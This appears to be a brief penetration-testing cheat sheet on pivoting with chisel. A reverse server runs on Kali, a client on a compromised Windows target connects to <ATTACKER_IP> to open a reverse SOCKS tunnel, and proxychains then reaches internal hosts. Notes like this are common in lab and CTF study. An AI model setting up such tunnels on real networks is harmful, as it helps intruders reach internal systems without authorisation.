on kali: 
```bash
./chisel server --reverse
```

on target:
```powershell
.\chisel.exe client <ATTACKER_IP>:8080 R:socks
```

then 
```bash
proxychains curl http://localhost/
```